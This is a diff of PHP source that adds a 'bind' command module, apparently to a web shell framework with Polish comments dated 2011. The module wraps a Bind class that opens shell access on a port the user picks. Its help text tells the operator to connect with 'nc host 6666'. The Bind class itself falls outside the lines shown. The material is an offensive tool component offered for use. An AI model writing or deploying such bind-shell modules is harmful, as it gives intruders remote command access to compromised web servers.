@@ -158,3 +158,128 @@ class Bind
 	}
 
 }
+
+/**
+ * =================================================================================================
+ */
+
+/**
+ * ModuleBind - Szkielet modulu
+ */
+class ModuleBind implements ShellInterface
+{
+	/**
+	 * Obiekt Shell
+	 *
+	 * @access private
+	 * @var    object
+	 */
+	private $oShell;
+
+	/**
+	 * Konstruktor
+	 *
+	 * @access public
+	 * @param  object $oShell Obiekt Shell
+	 * @return void
+	 */
+	public function __construct( Shell $oShell )
+	{
+		$this -> oShell = $oShell;
+	}
+
+	/**
+	 * Dostepna lista komend
+	 *
+	 * @access public
+	 * @return array
+	 */
+	public function getCommands()
+	{
+		return array( 'bind' );
+	}
+
+	/**
+	 * Zwracanie wersji modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getVersion()
+	{
+		/**
+		 * Wersja Data Autor
+		 */
+		return '1.0 2011-06-04 - <krzotr@gmail.com>';
+	}
+
+	/**
+	 * Zwracanie pomocy modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getHelp()
+	{
+		return <<<DATA
+Dostęp do powłoki na danym porcie
+
+	Użycie:
+		bind port
+
+		komenda ":exit" zamyka połączenie
+
+		najlepiej uruchomić w nowym oknie
+
+	Przykład:
+		bind 6666
+
+	NetCat:
+		nc host 6666
+DATA;
+	}
+
+	/**
+	 * Wywolanie modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function get()
+	{
+		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'Bind' ) )
+		{
+			return 'bind - !!! moduł nie został załadowany';
+		}
+
+		/**
+		 * Help
+		 */
+		if( $this -> oShell -> iArgc !== 1 )
+		{
+			return $this -> getHelp();
+		}
+
+		try
+		{
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oProxy = new Bind( $this -> oShell );
+			$oProxy -> setPort( $this -> oShell -> aArgv[0] )
+				-> get();
+			ob_end_flush();
+			exit ;
+		}
+		catch( BindException $oException )
+		{
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
+		}
+	}
+
+}
